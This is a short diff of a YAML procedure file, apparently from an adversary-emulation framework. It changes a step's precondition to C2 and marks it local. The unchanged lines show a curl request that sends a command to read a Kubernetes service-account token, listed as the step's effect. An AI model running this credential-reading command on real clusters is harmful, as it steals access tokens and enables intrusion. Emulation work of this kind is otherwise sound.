@@ -25,8 +25,9 @@ procedures:
         -H 'Content-Type: application/json' \
         -d '{"cmd":"cat /var/run/secrets/kubernetes.io/serviceaccount/token"}' \
         | jq -r '.output'
+    isLocal: true
 preconditions:
-  kind: System
+  kind: C2
 effects:
   - rawServiceaccountToken
 cleanup:
